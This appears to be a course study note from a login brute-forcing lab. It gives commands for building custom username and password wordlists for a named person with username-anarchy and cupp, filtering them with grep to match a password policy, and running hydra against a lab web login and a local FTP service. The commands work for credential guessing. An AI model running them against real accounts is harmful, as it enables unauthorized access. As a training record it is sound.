# Custom Wordlists

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

```bash
cupp -i
```

Filter that password list to match that policy,
```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```


```bash
hydra -L username-anarchy/jane_smith_usernames.txt -P jane-filtered.txt 94.237.56.137 -s 33347 -f  
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

[Captura pendiente de revisión: Pasted image 20241004150612.png](../../Resources/Audit/media.csv)

```bash
./username-anarchy Thomas Smith > usernames.txt
```

```bash
hydra -L usernames.txt -P passwords.txt ftp://localhost
```

[Captura pendiente de revisión: Pasted image 20241004152202.png](../../Resources/Audit/media.csv)

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | 13- Login Brute Forcing/3 - Custom Wordlists.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
